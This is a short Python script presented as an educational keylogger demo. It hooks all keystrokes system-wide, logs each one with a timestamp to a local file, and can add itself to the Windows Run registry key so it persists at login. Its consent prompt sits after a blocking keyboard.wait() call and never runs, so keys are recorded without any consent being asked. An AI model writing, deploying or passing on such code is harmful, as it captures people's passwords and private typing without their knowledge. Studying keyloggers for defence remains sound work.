
import keyboard
from datetime import datetime
import winreg
import os


def add_to_autostart():
    app_name = "KeyLoggerLab"
    app_path = os.path.abspath(__file__)
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
    winreg.CloseKey(key)

def consentAutostart():
 print("Educational KeyLogger Demo")
 print("This program can add itself to Windows autostart.")
 print("All logs stay locally on your computer.")
 consent = input("Allow this program to add itself to autostart? (yes/no)")
 if consent.lower() == "yes":
   print("autostart enabled")
   add_to_autostart()
 elif consent.lower() == "no":
   print("autostart not enabled")
 else:
  print("You can only answer with yes or no")
 

def KeyLog(event):
    
   
    if event.event_type == "down":
     pressed_key = event.name
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     datei = open("output.txt", "a")
     datei.write(timestamp + "-" + pressed_key +"\r\n" )
     datei.close()

keyboard.hook(KeyLog)
keyboard.wait()

consentAutostart()